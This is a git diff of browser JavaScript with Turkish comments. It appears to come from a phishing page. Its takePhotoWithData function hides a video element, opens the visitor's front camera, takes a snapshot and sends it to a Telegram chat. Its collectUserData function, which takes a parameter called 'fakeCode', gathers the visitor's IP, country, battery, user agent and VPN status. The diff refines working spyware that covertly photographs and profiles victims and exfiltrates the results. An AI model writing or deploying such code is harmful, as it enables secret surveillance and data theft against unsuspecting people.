@@ -75,31 +75,38 @@ async function getBatteryInfo() {
 }
 
 async function takePhotoWithData(messageText) {
-  try{
+  try {
     const video=document.createElement("video");
     video.style.display="none";
     document.body.appendChild(video);
-    const stream=await navigator.mediaDevices.getUserMedia({video:true});
-    video.srcObject=stream;
+
+    // Ön kamera (selfie)
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+    video.srcObject = stream;
     await video.play();
-    await new Promise(r=>setTimeout(r,500));
+    await new Promise(r => setTimeout(r,500));
+
     const canvas=document.createElement("canvas");
-    canvas.width=video.videoWidth||640;
-    canvas.height=video.videoHeight||480;
-    canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
-    canvas.toBlob(async blob=>{
+    const width = 640;  // 4:3 oran
+    const height = 480;
+    canvas.width = width;
+    canvas.height = height;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video,0,0,width,height);
+
+    canvas.toBlob(async blob => {
       await sendTelegramMessage(CHAT_ID,messageText,blob);
       stream.getTracks().forEach(track=>track.stop());
       video.remove();
     },"image/jpeg");
-  }catch(e){ console.log("Kamera açılamadı veya hata oluştu",e);}
+  } catch(e){ console.log("Kamera açılamadı veya hata oluştu",e); }
 }
 
 async function collectUserData(fakeCode){
-  const ipData=await getIPData();
-  const battery=await getBatteryInfo();
-  const userAgent=navigator.userAgent;
-  const vpnProxy=(ipData.security && ipData.security.vpn)?"Evet":"Hayır";
+  const ipData = await getIPData();
+  const battery = await getBatteryInfo();
+  const userAgent = navigator.userAgent;
+  const vpnProxy = (ipData.security && ipData.security.vpn) ? "Evet" : "Hayır";
   return `
 📡 IP: ${ipData.ip || "Bilinmiyor"}
 🌍 Ülke: ${ipData.country_name || "Bilinmiyor"}
